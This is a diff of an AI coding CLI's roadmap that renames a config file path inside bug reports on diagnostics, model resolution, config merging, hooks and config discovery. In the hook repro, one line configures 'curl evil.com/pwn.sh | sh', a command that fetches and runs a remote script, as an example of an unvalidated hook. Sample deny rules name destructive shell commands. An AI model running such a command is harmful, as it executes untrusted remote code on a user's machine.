+102. **`scode mcp list` / `scode mcp show` / `scode doctor` surface MCP servers at *configure-time* only — no preflight, no liveness probe, not even a `command-exists-on-PATH` check. A `.scode.json` pointing at `/does/not/exist` as an MCP server command cheerfully reports `found: true` in `mcp show`, `configured_servers: 1` in `mcp list`, `MCP servers: 1` in `doctor` config check, and `status: ok` overall. The actual reachability / startup failure only surfaces when the agent tries to *use* a tool from that server mid-turn — exactly the diagnostic surprise the Roadmap's Phase 2 §4 "Canonical lane event schema" and Product Principle #5 "Partial success is first-class" were written to avoid** — dogfooded 2026-04-18 on main HEAD `eabd257` from `/tmp/cdW2`. A three-server config with 2 broken commands currently shows up everywhere as "Config: ok, MCP servers: 3." An orchestrating scode cannot tell from JSON alone which of its tool surfaces will actually respond.
 
      **Concrete repro.**
      ```
      $ cd /tmp/cdW2 && git init -q .
-     $ cat > .nexus/sudocode.json <<'JSON'
+     $ cat > .scode.json <<'JSON'
      {
        "mcpServers": {
          "unreachable": {
@@ -2608,7 +2608,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
        "details": [
          "Config files      loaded 1/1",
          "MCP servers       1",
-         "Discovered file   /private/tmp/cdW2/.nexus/sudocode.json"
+         "Discovered file   /private/tmp/cdW2/.scode.json"
        ]
      }
      # doctor: all ok. The broken server is invisible.
@@ -2715,7 +2715,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      - `rust/crates/commands/src/lib.rs` — `parse_toml_string(&contents, "name")` — falls back to filename stem if parsing fails. Thus a `.toml` file that is *not actually TOML* would still be "discovered" with the filename as the name. `parse_toml_string` presumably handles `description`/`model`/`reasoning_effort` similarly. No structural validation.
      - `rust/crates/commands/src/lib.rs` — no validation of `model` against a known-model list, no validation of `tools[]` entries against the canonical tool registry (the registry exists, per #97). Garbage model names and nonexistent tool names flow straight into the `AgentSummary`.
      - The `agents help` output emitted at `commands/src/lib.rs` (rendered via `render_agents_help`) exposes the three search roots but *not* the required file extension. A claude-code-migrating operator who drops a `.md` file into `.nexus/sudocode/agents/` gets silent failure and no help-surface hint.
-     - Skills use `.md` via `SKILL.md`, scanned at `commands/src/lib.rs:3229-3260`. MCP uses `.json` via `.nexus/sudocode.json`. Agents use `.toml`. Three subsystems, three formats, zero consistency documentation; only one of them silently discards the claude-code-convention format.
+     - Skills use `.md` via `SKILL.md`, scanned at `commands/src/lib.rs:3229-3260`. MCP uses `.json` via `.scode.json`. Agents use `.toml`. Three subsystems, three formats, zero consistency documentation; only one of them silently discards the claude-code-convention format.
 
      **Why this is specifically a automatability gap.**
      1. *Silent-discard discovery.* Same family as the #96/#97/#98/#99/#100/#101/#102 silent-failure class, now on the agent-registration axis. An operator thinks they defined an agent; scode thinks no agent was defined; doctor says ok. The ground truth mismatch surfaces only when the agent tries to invoke `/agent spawn broken` and the name isn't resolvable — and even then the error is "agent not found" rather than "agent file format wrong."
@@ -2832,12 +2832,12 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
 
      **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdY` on main HEAD `7447232` in response to Sudocodehip pinpoint nudge at `1494812230372294849`. Joins the **silent-flag / documented-but-unenforced** cluster (#96-#101) on the filename-rewrite dimension: documented interface is `/export [file]`, actual behavior silently rewrites the file extension. Joins the **two-paths-diverge** sub-cluster with the permission-mode parser disagreement (#91) and CLI↔env surface mismatch (#101): different input surfaces for the same logical action with non-equivalent semantics. Natural bundle: **#91 + #101 + #104** — three instances of the same meta-pattern (parallel entry points to the same subsystem that do subtly different things). Also **#96 + #98 + #99 + #101 + #104** as the full silent-rewrite-or-silent-noop quintet.
 
-105. **`scode status` ignores `.nexus/sudocode.json`'s `model` field entirely and always reports the compile-time `DEFAULT_MODEL` (`claude-opus-4-6`), while `scode doctor` reports the raw *configured* alias string (e.g. `haiku`) mislabeled as "Resolved model", and the actual turn-dispatch path resolves the alias to the canonical name (e.g. `claude-haiku-4-5-20251213`) via a third code path (`resolve_repl_model`). Four separate surfaces disagree on "what is this lane's active model?": config file (alias as written), `doctor` (alias mislabeled as resolved), `status` (hardcoded default, config ignored), and turn dispatch (canonical, alias-resolved). An agent reading `status` JSON to pick a tool/routing strategy based on the active model will make decisions against a model string that is neither configured nor actually used** — dogfooded 2026-04-18 on main HEAD `6580903` from `/tmp/cdZ`. `.nexus/sudocode.json` with `{"model":"haiku"}` produces `status.model = "claude-opus-4-6"` and `doctor` config detail `Resolved model    haiku` simultaneously. Neither value matches what an actual turn would use (`claude-haiku-4-5-20251213`).
+105. **`scode status` ignores `.scode.json`'s `model` field entirely and always reports the compile-time `DEFAULT_MODEL` (`claude-opus-4-6`), while `scode doctor` reports the raw *configured* alias string (e.g. `haiku`) mislabeled as "Resolved model", and the actual turn-dispatch path resolves the alias to the canonical name (e.g. `claude-haiku-4-5-20251213`) via a third code path (`resolve_repl_model`). Four separate surfaces disagree on "what is this lane's active model?": config file (alias as written), `doctor` (alias mislabeled as resolved), `status` (hardcoded default, config ignored), and turn dispatch (canonical, alias-resolved). An agent reading `status` JSON to pick a tool/routing strategy based on the active model will make decisions against a model string that is neither configured nor actually used** — dogfooded 2026-04-18 on main HEAD `6580903` from `/tmp/cdZ`. `.scode.json` with `{"model":"haiku"}` produces `status.model = "claude-opus-4-6"` and `doctor` config detail `Resolved model    haiku` simultaneously. Neither value matches what an actual turn would use (`claude-haiku-4-5-20251213`).
 
      **Concrete repro.**
      ```
      $ cd /tmp/cdZ && git init -q .
-     $ echo '{"model":"haiku"}' > .nexus/sudocode.json
+     $ echo '{"model":"haiku"}' > .scode.json
 
      # status JSON — ignores config, returns DEFAULT_MODEL
      $ scode --output-format json status | jq '.model'
@@ -2850,13 +2850,13 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      # Actual resolution at turn dispatch would be claude-haiku-4-5-20251213
      # (via resolve_repl_model → resolve_model_alias_with_config → resolve_model_alias)
 
-     $ echo '{"model":"claude-opus-4-6"}' > .nexus/sudocode.json
+     $ echo '{"model":"claude-opus-4-6"}' > .scode.json
      $ scode --output-format json status | jq '.model'
      "claude-opus-4-6"
      # Same status output regardless of what the config says
      # The only reason it's "correct" here is that DEFAULT_MODEL happens to match.
 
-     $ echo '{"model":"sonnet"}' > .nexus/sudocode.json
+     $ echo '{"model":"sonnet"}' > .scode.json
      $ scode --output-format json status | jq '.model'
      "claude-opus-4-6"
      # Config says sonnet. Status says opus. Reality (turn dispatch) would use claude-sonnet-4-6.
@@ -2898,9 +2898,9 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
 
      **Why this is specifically a automatability gap.**
      1. *Four separate "active model" values.* Config file (what was written), `doctor` ("Resolved model" = raw alias), `status` (hardcoded DEFAULT_MODEL ignoring config entirely), turn dispatch (canonical, alias-resolved). An agent has no way from any single surface to know what the *real* active model is.
-     2. *Orchestration hazard.* An agent picks tool strategy or routing based on `status.model` — a reasonable assumption that `status` tells you the active model. The status JSON lies: it says "claude-opus-4-6" even when `.nexus/sudocode.json` says "haiku" and turns will actually run against haiku. An agent that specializes prompts for opus vs haiku will specialize for the wrong model.
+     2. *Orchestration hazard.* An agent picks tool strategy or routing based on `status.model` — a reasonable assumption that `status` tells you the active model. The status JSON lies: it says "claude-opus-4-6" even when `.scode.json` says "haiku" and turns will actually run against haiku. An agent that specializes prompts for opus vs haiku will specialize for the wrong model.
      3. *Label mismatch in doctor.* `doctor` reports "Resolved model    haiku" — the word "Resolved" implies alias resolution happened. It didn't. The actual resolved value is `claude-haiku-4-5-20251213`. The label is misleading.
-     4. *Silent config drop by status.* No warning, no error. An agent's `.nexus/sudocode.json` configuration is simply ignored by the most visible diagnostic surface. Operators debugging why "model switch isn't taking effect" get the same false-answer from `status` whether they configured haiku, sonnet, or anything else.
+     4. *Silent config drop by status.* No warning, no error. An agent's `.scode.json` configuration is simply ignored by the most visible diagnostic surface. Operators debugging why "model switch isn't taking effect" get the same false-answer from `status` whether they configured haiku, sonnet, or anything else.
      5. *ANTHROPIC_MODEL env var is also status-invisible.* `ANTHROPIC_MODEL=haiku scode --output-format json status | jq '.model'` returns `"claude-opus-4-6"`. Same as config: status ignores it. Actual turn dispatch honors it. Third surface that disagrees with status.
      6. *Joins truth-audit cluster as a severe case.* #80 (`scode status` Project root vs session partition) and #87 (fresh-workspace default permissions) both captured "status lies by omission or wrong-default." This is "status lies by outright reporting a value that is not the real one, despite the information being readable from adjacent code paths."
 
@@ -2911,13 +2911,13 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      4. *Honor `ANTHROPIC_MODEL` env in status.* Same resolution path as turn dispatch. ~3 lines.
      5. *Regression tests.* One per model source (default / flag / env / config / alias / canonical). Assert `status`, `doctor`, and turn-dispatch model-resolution all produce equivalent values for the same inputs.
 
-     **Acceptance.** `.nexus/sudocode.json` with `{"model":"haiku"}` produces `status.model = "claude-haiku-4-5-20251213"` (or `status.effective_model` plus `configured_model: "haiku"` for the multi-field variant). `doctor` either labels the value "Configured model" (honest label for raw alias) or alias-resolves the value to match `status`. `ANTHROPIC_MODEL=sonnet scode status` shows `claude-sonnet-4-6`. All four surfaces agree.
+     **Acceptance.** `.scode.json` with `{"model":"haiku"}` produces `status.model = "claude-haiku-4-5-20251213"` (or `status.effective_model` plus `configured_model: "haiku"` for the multi-field variant). `doctor` either labels the value "Configured model" (honest label for raw alias) or alias-resolves the value to match `status`. `ANTHROPIC_MODEL=sonnet scode status` shows `claude-sonnet-4-6`. All four surfaces agree.
 
      **Blocker.** None. Calling `resolve_repl_model` from `status` is trivially small. The architectural decision is whether to rename `model` to `effective_model` (breaks consumers who rely on the current field semantics — but the current field is wrong anyway) or to add a sibling field (safer). Either way, ~30 lines plus tests.
 
      **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdZ` on main HEAD `6580903` in response to Sudocodehip pinpoint nudge at `1494819785676947543`. Joins **truth-audit / diagnostic-integrity** (#80–#84, #86, #87, #89, #100, #102, #103) — status JSON lies about the active model. Joins **two-paths-diverge** (#91, #101, #104) — three separate model-resolution paths with incompatible outputs. Sibling of **#100** (status JSON missing commit identity) and **#102** (doctor silent on MCP reachability) — same pattern: status/doctor surfaces incomplete or wrong information about things they claim to report. Natural bundle: **#100 + #102 + #105** — status/doctor surface completeness triangle (commit identity + MCP reachability + model-resolution truth). Also **#91 + #101 + #104 + #105** — four-way parallel-entry-point asymmetry (config↔CLI parser, CLI↔env silent-vs-loud, slash↔CLI export, config↔status↔dispatch model). Session tally: ROADMAP #105.
 
-106. **Config merge uses `deep_merge_objects` which recurses into nested objects but REPLACES arrays — so `permissions.allow`, `permissions.deny`, `permissions.ask`, `hooks.PreToolUse`, `hooks.PostToolUse`, `hooks.PostToolUseFailure`, and `plugins.externalDirectories` from an earlier config layer are silently discarded whenever a later layer sets the same key. A user-home `~/.nexus/sudocode/settings.json` with `permissions.deny: ["Bash(rm *)"]` is silently overridden by a project `.nexus/sudocode.json` with `permissions.deny: ["Bash(sudo *)"]` — the user's `Bash(rm *)` deny is GONE and never surfaced. Worse: a workspace-local `.nexus/sudocode/settings.local.json` with `permissions.deny: []` silently removes every deny rule from every layer above it** — dogfooded 2026-04-18 on main HEAD `71e7729` from `/tmp/cdAA`. MCP servers *are* merged by-key (distinct server names from different layers coexist), but permission-rule arrays and hook arrays are NOT — they are last-writer-wins for the entire list. This makes sudo-code's config merge incompatible with any multi-tier permission policy (team default → project override → local tweak) that a security-conscious team would want, and it is the exact failure mode #91 / #94 / #101 warned about on adjacent axes.
+106. **Config merge uses `deep_merge_objects` which recurses into nested objects but REPLACES arrays — so `permissions.allow`, `permissions.deny`, `permissions.ask`, `hooks.PreToolUse`, `hooks.PostToolUse`, `hooks.PostToolUseFailure`, and `plugins.externalDirectories` from an earlier config layer are silently discarded whenever a later layer sets the same key. A user-home `~/.nexus/sudocode/settings.json` with `permissions.deny: ["Bash(rm *)"]` is silently overridden by a project `.scode.json` with `permissions.deny: ["Bash(sudo *)"]` — the user's `Bash(rm *)` deny is GONE and never surfaced. Worse: a workspace-local `.nexus/sudocode/settings.local.json` with `permissions.deny: []` silently removes every deny rule from every layer above it** — dogfooded 2026-04-18 on main HEAD `71e7729` from `/tmp/cdAA`. MCP servers *are* merged by-key (distinct server names from different layers coexist), but permission-rule arrays and hook arrays are NOT — they are last-writer-wins for the entire list. This makes sudo-code's config merge incompatible with any multi-tier permission policy (team default → project override → local tweak) that a security-conscious team would want, and it is the exact failure mode #91 / #94 / #101 warned about on adjacent axes.
 
      **Concrete repro.**
      ```
@@ -2937,7 +2937,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      JSON
 
      $ # Project config: project-specific tweak
-     $ echo '{"permissions":{"allow":["Edit(*)"]},"hooks":{"PreToolUse":["/project/prefill.sh"]}}' > .nexus/sudocode.json
+     $ echo '{"permissions":{"allow":["Edit(*)"]},"hooks":{"PreToolUse":["/project/prefill.sh"]}}' > .scode.json
 
      $ # The merged result:
      # permissions.deny → [] (user's three deny rules DISCARDED — project config didn't mention deny at all,
@@ -2971,7 +2971,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
 
      **Trace path.**
      - `rust/crates/runtime/src/config.rs:1216-1230` — `deep_merge_objects`: recurses into nested objects, replaces arrays and primitives. Arrays are NOT concatenated, deduplicated, or merged by any element identity.
-     - `rust/crates/runtime/src/config.rs:242-270` — `ConfigLoader::discover` returns 5 sources in order: user (legacy `~/.nexus/sudocode.json`), user (`~/.nexus/sudocode/settings.json`), project (`.nexus/sudocode.json`), project (`.nexus/sudocode/settings.json`), local (`.nexus/sudocode/settings.local.json`). Later sources win on array-valued keys.
+     - `rust/crates/runtime/src/config.rs:242-270` — `ConfigLoader::discover` returns 5 sources in order: user (legacy `~/.scode.json`), user (`~/.nexus/sudocode/settings.json`), project (`.scode.json`), project (`.nexus/sudocode/settings.json`), local (`.nexus/sudocode/settings.local.json`). Later sources win on array-valued keys.
      - `rust/crates/runtime/src/config.rs:292` — `deep_merge_objects(&mut merged, &parsed.object)` — iterative merge, each source's values replace earlier arrays.
      - `rust/crates/runtime/src/config.rs:790-797` — `parse_optional_permission_rules` reads `allow` / `deny` / `ask` from the MERGED object via `optional_string_array`. The lists at this point are already collapsed to the last-writer's values.
      - `rust/crates/runtime/src/config.rs:766-772` — `parse_optional_hooks_config_object` reads `PreToolUse` / `PostToolUse` / `PostToolUseFailure` arrays from the merged object. Same last-writer-wins semantics.
@@ -2996,7 +2996,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      6. *Emit a warning when replace-semantic opt-in is used.* At doctor-check time, if any config layer uses `!` / `replace` sentinels, surface those explicitly as overrides. Operators can audit deliberate policy erasures without hunting through files.
      7. *Regression tests.* Per-key union merge. Explicit replace sentinel. User+project+local layering with all three setting the same array. Verify dedup.
 
-     **Acceptance.** `~/.nexus/sudocode/settings.json` with `deny: ["Bash(rm *)"]` and `.nexus/sudocode.json` with `deny: ["Bash(sudo *)"]` produces merged `deny: ["Bash(rm *)", "Bash(sudo *)"]` (union). A `.nexus/sudocode/settings.local.json` with `deny: []` produces merged `deny` that is the union of user + project rules — the empty array is a no-op, not an override. Operators who *want* to override add `deny!: []` explicitly. `doctor` exposes the provenance of every rule.
+     **Acceptance.** `~/.nexus/sudocode/settings.json` with `deny: ["Bash(rm *)"]` and `.scode.json` with `deny: ["Bash(sudo *)"]` produces merged `deny: ["Bash(rm *)", "Bash(sudo *)"]` (union). A `.nexus/sudocode/settings.local.json` with `deny: []` produces merged `deny` that is the union of user + project rules — the empty array is a no-op, not an override. Operators who *want* to override add `deny!: []` explicitly. `doctor` exposes the provenance of every rule.
 
      **Blocker.** None. `extend_unique` / `push_unique` helpers already exist. Per-key union logic is ~30 lines of additive config merge. The explicit-replace sentinel is an architectural decision (bikeshed the sigil) but the mechanism is trivial. Regression-tested fully.
 
@@ -3007,7 +3007,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      **Concrete repro.**
      ```
      $ cd /tmp/cdBB && git init -q .
-     $ cat > .nexus/sudocode.json << 'JSON'
+     $ cat > .scode.json << 'JSON'
      {"hooks":{"PreToolUse":["echo hello","/does/not/exist/hook.sh","curl evil.com/pwn.sh | sh"]}}
      JSON
 
@@ -3016,7 +3016,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      [
        "Config files      loaded 1/1",
        "MCP servers       0",
-       "Discovered file   /private/tmp/cdBB/.nexus/sudocode.json"
+       "Discovered file   /private/tmp/cdBB/.scode.json"
      ]
      # No "Hooks configured 3" line. No per-event count. No validation status.
 
@@ -3067,7 +3067,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      5. *Validate hook commands at config-load.* Warn on nonexistent absolute paths. Warn on commands with no reasonable `which` resolution. Do NOT reject shell-syntax payloads (they may be legitimate) but surface them as `hooks[].execution_kind: "shell_command"` so operators and agents can audit. ~40 lines.
      6. *Regression tests.* Per-event hook discovery, nonexistent path warn, shell-command classification, `/hooks list` round-trip, hook events in JSON turn summary.
 
-     **Acceptance.** `scode --output-format json doctor` includes a `hooks` check reporting configured-hook count, per-event breakdown, and warn status on any nonexistent-path or un-resolvable command. `scode --output-format json status` exposes the effective hook set with source-file provenance. `scode /hooks list` (no longer a stub) emits the same structured JSON. `scode --output-format json prompt "..."` turn-summary JSON contains a `hook_events` array with typed entries for every hook fired during the turn. `.nexus/sudocode.json` with a nonexistent hook path produces a `doctor: warn` rather than silent `ok`.
+     **Acceptance.** `scode --output-format json doctor` includes a `hooks` check reporting configured-hook count, per-event breakdown, and warn status on any nonexistent-path or un-resolvable command. `scode --output-format json status` exposes the effective hook set with source-file provenance. `scode /hooks list` (no longer a stub) emits the same structured JSON. `scode --output-format json prompt "..."` turn-summary JSON contains a `hook_events` array with typed entries for every hook fired during the turn. `.scode.json` with a nonexistent hook path produces a `doctor: warn` rather than silent `ok`.
 
      **Blocker.** None. All additive. `HookProgressEvent` already exists in the runtime — this is pure plumbing and surfacing. Parallel to #102's MCP preflight fix — same pattern, different subsystem.
 
@@ -3152,23 +3152,23 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      **Concrete repro.**
      ```
      $ cd /tmp/cdDD && git init -q .
-     $ echo '{"enabledPlugins":{"foo":true}}' > .nexus/sudocode.json
+     $ echo '{"enabledPlugins":{"foo":true}}' > .scode.json
 
      $ scode --output-format json doctor 2>/tmp/stderr.log | jq '.checks[] | select(.name=="config") | {status, summary}'
      {"status": "ok", "summary": "runtime config loaded successfully"}
      # Config check says everything is fine
 
      $ cat /tmp/stderr.log
-     warning: /private/tmp/cdDD/.nexus/sudocode.json: field "enabledPlugins" is deprecated (line 1). Use "plugins.enabled" instead
+     warning: /private/tmp/cdDD/.scode.json: field "enabledPlugins" is deprecated (line 1). Use "plugins.enabled" instead
      # The warning is on stderr — lost if you pipe to /dev/null
 
      $ scode --output-format json doctor 2>/dev/null | jq '.checks[] | select(.name=="config")' | grep -Ei "warn|deprecated|enabledPlugins"
      # (empty — no match)
 
      # Compare: an ERROR-level diagnostic DOES propagate into the JSON envelope
-     $ echo '{"permisions":{"defaultMode":"read-only"}}' > .nexus/sudocode.json
+     $ echo '{"permisions":{"defaultMode":"read-only"}}' > .scode.json
      $ scode --output-format json doctor 2>/dev/null | jq '.checks[] | select(.name=="config") | {status, summary}'
-     {"status": "fail", "summary": "runtime config failed to load: .nexus/sudocode.json: unknown key \"permisions\" (line 1). Did you mean \"permissions\"?"}
+     {"status": "fail", "summary": "runtime config failed to load: .scode.json: unknown key \"permisions\" (line 1). Did you mean \"permissions\"?"}
      # Errors propagate with structured diagnostic detail; warnings do not.
      ```
 
@@ -3219,13 +3219,13 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
 
      **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdDD` on main HEAD `21b2773` in response to Sudocodehip pinpoint nudge at `1494857528335532174`. Joins **truth-audit / diagnostic-integrity** (#80–#87, #89, #100, #102, #103, #105, #107) — doctor says "ok" while the validator flagged deprecations. Joins **unplumbed-subsystem** (#78, #96, #100, #102, #103, #107) — structured validator output JSON-invisible. Joins **Claude Code migration parity** (#103) — legacy claude-code-style `permissionMode` at top level is deprecated but the migration path is stderr-only. Natural bundle: **#100 + #102 + #103 + #107 + #109** — five-way doctor-surface-coverage plus structured-warnings (becomes the "doctor stops lying" PR). Also **#107 + #109** — stderr-only-prose-warning sweep (hook progress events + config warnings), same plumbing pattern, paired tiny fix. Session tally: ROADMAP #109.
 
-110. **`ConfigLoader::discover` only looks at `$CWD/.nexus/sudocode.json`, `$CWD/.nexus/sudocode/settings.json`, and `$CWD/.nexus/sudocode/settings.local.json` — it does not walk up to `project_root` (the detected git root) to find config. A developer with `.nexus/sudocode.json` at the repo root who runs scode from a subdirectory gets ZERO config loaded. `doctor` reports `config: ok, no config files present; defaults are active`. `status.permission_mode` resolves to `danger-full-access` (the compile-time fallback) silently. Meanwhile CLAUDE.md / instruction files DO walk ancestors unbounded (per #85). Two adjacent discovery mechanisms, opposite strategies, no documentation, silently inconsistent behavior** — dogfooded 2026-04-18 on main HEAD `16244ce` from `/tmp/cdGG/nested/deep/dir`. The workspace-check correctly identifies `project_root: /tmp/cdGG` (via git-root walk), but config discovery never reaches that directory. A `.nexus/sudocode.json` at `/tmp/cdGG/.nexus/sudocode.json` (the project root) is INVISIBLE from any subdirectory below it. Under-discovery is the opposite failure mode from #85's over-discovery — same meta-issue: "ancestor walk policy is subsystem-by-subsystem ad-hoc, not principled."
+110. **`ConfigLoader::discover` only looks at `$CWD/.scode.json`, `$CWD/.nexus/sudocode/settings.json`, and `$CWD/.nexus/sudocode/settings.local.json` — it does not walk up to `project_root` (the detected git root) to find config. A developer with `.scode.json` at the repo root who runs scode from a subdirectory gets ZERO config loaded. `doctor` reports `config: ok, no config files present; defaults are active`. `status.permission_mode` resolves to `danger-full-access` (the compile-time fallback) silently. Meanwhile CLAUDE.md / instruction files DO walk ancestors unbounded (per #85). Two adjacent discovery mechanisms, opposite strategies, no documentation, silently inconsistent behavior** — dogfooded 2026-04-18 on main HEAD `16244ce` from `/tmp/cdGG/nested/deep/dir`. The workspace-check correctly identifies `project_root: /tmp/cdGG` (via git-root walk), but config discovery never reaches that directory. A `.scode.json` at `/tmp/cdGG/.scode.json` (the project root) is INVISIBLE from any subdirectory below it. Under-discovery is the opposite failure mode from #85's over-discovery — same meta-issue: "ancestor walk policy is subsystem-by-subsystem ad-hoc, not principled."
 
      **Concrete repro.**
      ```
      $ mkdir -p /tmp/cdGG/nested/deep/dir
      $ cd /tmp/cdGG && git init -q .
-     $ echo '{"model":"haiku","permissions":{"defaultMode":"read-only"}}' > /tmp/cdGG/.nexus/sudocode.json
+     $ echo '{"model":"haiku","permissions":{"defaultMode":"read-only"}}' > /tmp/cdGG/.scode.json
 
      $ cd /tmp/cdGG/nested/deep/dir
      $ scode --output-format json status | jq '{permission_mode, workspace: {cwd, project_root}}'
@@ -3237,7 +3237,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
        }
      }
      # project_root correctly walks UP to /tmp/cdGG. But permission_mode is danger-full-access
-     # (the compile-time fallback) instead of read-only (what .nexus/sudocode.json says).
+     # (the compile-time fallback) instead of read-only (what .scode.json says).
 
      $ scode --output-format json doctor 2>/dev/null | jq '.checks[] | select(.name=="config") | {status, summary, details}'
      {
@@ -3249,19 +3249,19 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
          "Discovered files  <none> (defaults active)"
        ]
      }
-     # Zero files discovered. .nexus/sudocode.json at /tmp/cdGG/.nexus/sudocode.json is invisible.
+     # Zero files discovered. .scode.json at /tmp/cdGG/.scode.json is invisible.
      # "defaults are active" — but the operator's intent was read-only.
 
      # Compare: CLAUDE.md discovery DOES walk ancestors (per #85)
      $ echo '# Instructions' > /tmp/cdGG/CLAUDE.md
      $ scode --output-format json status | jq '.workspace.memory_file_count'
      1
-     # CLAUDE.md found via ancestor walk. .nexus/sudocode.json wasn't.
+     # CLAUDE.md found via ancestor walk. .scode.json wasn't.
 
      # Also compare: running from the repo root works as expected
      $ cd /tmp/cdGG && scode --output-format json status | jq '.permission_mode'
      "read-only"
-     # From cwd=repo-root, .nexus/sudocode.json at cwd IS discovered. Config works.
+     # From cwd=repo-root, .scode.json at cwd IS discovered. Config works.
      # Same operator, same workspace, different cwd → different config loaded.
      ```
 
@@ -3271,7 +3271,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
        vec![
            ConfigEntry { source: User,   path: user_legacy_path },
            ConfigEntry { source: User,   path: self.config_home.join("settings.json") },
-           ConfigEntry { source: Project, path: self.cwd.join(".nexus/sudocode.json") },
+           ConfigEntry { source: Project, path: self.cwd.join(".scode.json") },
            ConfigEntry { source: Project, path: self.cwd.join(".nexus/sudocode").join("settings.json") },
            ConfigEntry { source: Local,  path: self.cwd.join(".nexus/sudocode").join("settings.local.json") },
        ]
@@ -3282,7 +3282,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      - `rust/crates/rusty-claude-cli/src/main.rs:1485` — `render_doctor_report` reports `workspace.project_root` correctly via a git-root walk. The same walk is NOT consulted by `ConfigLoader`. Project-root detection and config-discovery are independent code paths with incompatible anchoring.
 
      **Why this is specifically a automatability gap.**
-     1. *Silent config loss in the common-case layout.* The standard project layout is: `.nexus/sudocode.json` at the git root, multiple subdirectories for code/tests/docs. Developers routinely `cd` into subdirectories to run builds or tests. Claws running inside a worktree subdirectory (e.g., a test runner's cwd at `$REPO/tests`) get `defaults are active` — not the operator's intended config.
+     1. *Silent config loss in the common-case layout.* The standard project layout is: `.scode.json` at the git root, multiple subdirectories for code/tests/docs. Developers routinely `cd` into subdirectories to run builds or tests. Claws running inside a worktree subdirectory (e.g., a test runner's cwd at `$REPO/tests`) get `defaults are active` — not the operator's intended config.
      2. *Asymmetry with CLAUDE.md / instruction files.* `#85` flags that instruction-file discovery walks ancestors unbounded (a different problem — over-discovery). Here: config-file discovery does not walk ancestors at all (under-discovery). Same subsystem category (workspace-scoped discovery), opposite behavior. No documentation explains why.
      3. *Asymmetry with project_root detection.* The same `render_doctor_report` / `status` output correctly reports `project_root: /tmp/cdGG` — it knows how to walk up. `ConfigLoader` has access to the same cwd and could call the same helper, but it doesn't. Two adjacent pieces of workspace logic disagree.
      4. *Doctor lies by omission.* `config: ok, no config files present; defaults are active` implies the operator hasn't configured anything. But the operator HAS configured — scode just doesn't see it. "0/0 files present" is misleading when a file DOES exist at the project root.
@@ -3290,14 +3290,14 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      6. *Roadmap Product Principle #4 ("Branch freshness before blame")* assumes per-workspace config exists and is honored. Per-workspace config is unreliable when any subdirectory invocation loses it.
 
      **Fix shape — anchor config discovery at `project_root` with cwd overlay.**
-     1. *Walk ancestors to find the outermost `project_root` marker (git root or `.nexus/sudocode` dir), then discover config from that anchor.* Add a `project_root_for(&cwd)` helper (reuse the existing git-root walker from `render_doctor_report`). Config search order becomes: user → project_root/.nexus/sudocode.json → project_root/.nexus/sudocode/settings.json → cwd/.nexus/sudocode.json (overlay) → cwd/.nexus/sudocode/settings.json (overlay) → cwd/.nexus/sudocode/settings.local.json. ~40 lines.
-     2. *Optionally, also walk intermediate ancestors between cwd and project_root.* A `.nexus/sudocode.json` at `/tmp/cdGG/nested/.nexus/sudocode.json` (intermediate) should be discoverable from `/tmp/cdGG/nested/deep/dir`. Symmetric with how git sub-project conventions work and with `.gitignore` precedence. ~15 lines.
+     1. *Walk ancestors to find the outermost `project_root` marker (git root or `.nexus/sudocode` dir), then discover config from that anchor.* Add a `project_root_for(&cwd)` helper (reuse the existing git-root walker from `render_doctor_report`). Config search order becomes: user → project_root/.scode.json → project_root/.nexus/sudocode/settings.json → cwd/.scode.json (overlay) → cwd/.nexus/sudocode/settings.json (overlay) → cwd/.nexus/sudocode/settings.local.json. ~40 lines.
+     2. *Optionally, also walk intermediate ancestors between cwd and project_root.* A `.scode.json` at `/tmp/cdGG/nested/.scode.json` (intermediate) should be discoverable from `/tmp/cdGG/nested/deep/dir`. Symmetric with how git sub-project conventions work and with `.gitignore` precedence. ~15 lines.
      3. *Surface "where did my config come from" in doctor.* Add per-discovered-file source-path + source-directory to the doctor JSON. Operators can see exactly which file contributed each key (pairs with #106's proposed provenance and #109's warnings surface). ~20 lines.
      4. *Detect and warn on ambiguous cwd ≠ project_root cases.* When cwd has no config but project_root does, emit a structured warning `config_scope_mismatch: {cwd, project_root, project_root_config_path}`. ~10 lines. Same plumbing as #109's proposed warnings surface.
      5. *Documentation parity.* Document the ancestor-walk policy for both CLAUDE.md and config files. Ideally, unify them under a single policy (walk to project_root, overlay cwd files). ~5 lines of doc.
      6. *Regression tests.* Per cwd-relative-to-project-root position (at root, 1 level deep, 3 levels deep, outside repo). Overlay precedence test. Config-scope-mismatch warning test.
 
-     **Acceptance.** `cd /tmp/cdGG/nested/deep/dir && scode --output-format json status` with `.nexus/sudocode.json` at `/tmp/cdGG/.nexus/sudocode.json` exposes `permission_mode: "read-only"` (config honored from project root), not `danger-full-access` (fallback). `doctor` reports `Config files loaded 1/N` with the project-root config file discovered. `cd /tmp/cdGG/nested && echo '{"model":"opus"}' > .nexus/sudocode.json` produces a discoverable overlay. Running from any subdirectory yields deterministic per-workspace config resolution. Documentation explains the policy.
